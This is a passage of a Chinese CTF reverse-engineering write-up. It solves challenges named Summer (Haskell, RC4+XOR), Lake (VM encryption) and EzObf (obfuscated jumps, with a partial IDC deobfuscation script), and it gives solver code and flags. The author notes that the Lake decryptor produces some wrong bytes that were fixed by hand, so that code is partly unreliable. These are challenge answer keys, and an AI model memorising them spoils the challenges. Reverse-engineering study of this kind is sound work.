       -2565957437423125689, 
        224890624719110086, 
        1357324823849588894, 
        - 8941695979231947288, 
        - 253413330424273460, 
        - 7817463785137710741, 
        - 5620500441869335673, 
        984060876288820705, 
        - 6993555743080142153, 
        - 7892488171899690683, 
        7190415315123037707, 
        - 7218240302740981077
    &#125;;
    char flag[25] &#x3D; &#123; 0 &#125;;
    int flag_index &#x3D; 0;


    for (int k &#x3D; 0; k &lt; 12; k++) &#123;
        uint64_t target_crc &#x3D; enc[k];
        int found &#x3D; 0;
        for (unsigned char c1 &#x3D; 32; c1 &lt; 127 &amp;&amp; !found; c1++) &#123;
            for (unsigned char c2 &#x3D; 32; c2 &lt; 127 &amp;&amp; !found; c2++) &#123;
                unsigned char test[2] &#x3D; &#123; c1, c2 &#125;;
                uint64_t crc &#x3D; calculate_crc64_direct(test, 2);
                if (crc &#x3D;&#x3D; target_crc) &#123;
                    flag[flag_index++] &#x3D; c1;
                    flag[flag_index++] &#x3D; c2;
                    break;
                &#125;
            &#125;
        &#125;
    &#125;

    flag[flag_index] &#x3D; &#39;\0&#39;;
    printf(&quot;Decrypted flag: %s\n&quot;, flag);

    return 0;
&#125;
&#x2F;&#x2F;flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</code></pre>

<h3 id="Summer"><a href="#Summer" class="headerlink" title="Summer"></a>Summer</h3><p>haskell程序</p>
<p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p>
<p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p>
<p><img src="/images/31-1744626745338-24.png" loading="lazy"></p>
<p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p>
<p><img src="/images/19-1744626745338-25.png" loading="lazy"></p>
<p>GHCziInternalziBase也是底层函数，主要关注两个参数</p>
<p><img src="/images/20-1744626745338-26.png" loading="lazy"></p>
<p>第一个参数的地址处的函数为打印字符串</p>
<p><img src="/images/21-1744626745338-27.png" loading="lazy"></p>
<p><img src="/images/22-1744626745338-28.png" loading="lazy"></p>
<p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc<strong>，</strong>zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p>
<p><img src="/images/23-1744626745338-29.png" loading="lazy"></p>
<p><img src="/images/24-1744626745338-30.png" loading="lazy"></p>
<p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p>
<p><img src="/images/25-1744626745338-31.png" loading="lazy"></p>
<p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p>
<p><img src="/images/26-1744626745338-32.png" loading="lazy"></p>
<p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p>
<p><img src="/images/27-1744626745338-33.png" loading="lazy"></p>
<p><img src="/images/28-1744626745338-34.png" loading="lazy"></p>
<p><img src="/images/29-1744626745338-35.png" loading="lazy"></p>
<p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p>
<p><img src="/images/30-1744626745338-36.png" loading="lazy"></p>
<p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p>
<p><img src="/images/32-1744626745338-37.png" loading="lazy"></p>
<p><img src="/images/33-1744626745338-38.png" loading="lazy"></p>
<p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p>
<p><img src="/images/34-1744626745338-39.png" loading="lazy"></p>
<p><img src="/images/35-1744626745338-40.png" loading="lazy"></p>
<p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p>
<h3 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h3><p>单步跟到主函数。</p>
<p><img src="/images/36-1744626745338-41.png" loading="lazy"></p>
<p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p>
<p><img src="/images/37-1744626745338-42.png" loading="lazy"></p>
<p>然后接着第二次加密，最后循环比较。</p>
<p><img src="/images/38-1744626745338-44.png" loading="lazy"></p>
<p><img src="/images/39-1744626745338-43.png" loading="lazy"></p>
<p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p>
<p><img src="/images/40-1744626745338-45.png" loading="lazy"></p>
<p><img src="/images/41-1744626745338-46.png" loading="lazy"></p>
<p><img src="/images/42-1744626745338-48.png" loading="lazy"></p>
<p>调试输出：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">Input<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">85</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">6</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">13</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">15</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">126</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">3</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">11</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">7</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">4</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">14</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">52</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">119</span><span class="token punctuation">;</span></code></pre>

<p>这也就是第一层加密的解密代码。</p>
<p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p>
<p>完整解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>

<span class="token keyword">void</span> <span class="token function">decrypt_func</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> temp<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> block<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>base <span class="token operator">&lt;</span> len<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            block<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            block<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> base <span class="token operator">+</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                data<span class="token punctuation">[</span>base <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> block<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> Input<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span>
        <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span>
        <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">decrypt_func</span><span class="token punctuation">(</span>Input<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">85</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">13</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">15</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">126</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">14</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">52</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">119</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.40s\n"</span><span class="token punctuation">,</span> Input<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -> flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p>
<h3 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h3><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p>
<p>混淆流程：</p>
<ol>
<li>执行真实指令</li>
<li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li>
<li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li>
</ol>
<p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p>
<p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p>
<p><img src="/images/43-1744626745338-47.png" loading="lazy"></p>
<p>deobf idc脚本：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token function">NopCode</span><span class="token punctuation">(</span>Addr<span class="token punctuation">,</span> Length<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">PatchByte</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token function">rol</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> count<span class="token punctuation">,</span> bits <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    count <span class="token operator">=</span> count <span class="token operator">%</span> bits<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">value</span> <span class="token generic class-name"><span class="token operator">&lt;&lt;</span> count<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>value <span class="token operator">>></span></span></span> <span class="token punctuation">(</span>bits <span class="token operator">-</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bits<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 搜索真实汇编代码的下一个地址</span>
<span class="token keyword">static</span> <span class="token function">FindEnd</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x90</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> v <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
